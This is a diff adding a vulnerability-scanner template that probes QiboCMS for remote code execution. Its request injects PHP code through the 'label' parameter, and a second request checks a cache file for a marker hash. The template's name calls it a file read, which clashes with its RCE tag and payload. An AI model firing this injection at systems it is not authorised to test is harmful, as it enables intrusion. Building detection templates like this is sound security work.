@@ -1,0 +1,25 @@
+id: poc-yaml-qibocms-rce
+info:
+  name: QiboCMS Arbitrary File Read
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: rce
+http:
+  - raw:
+      - |
+        GET /index.php?label[a'."${@var_dump(md5(0x1111))}".'][asd]=aaaa HTTP/1.1
+        Host: {{Hostname}}
+    matchers:
+      - type: status
+        status:
+          - 200
+  - raw:
+      - |
+        GET /cache/label_cache/index_1_0_0_0_0_46449.php HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "665d5cbb82b5785d9f344c46417c6c36"
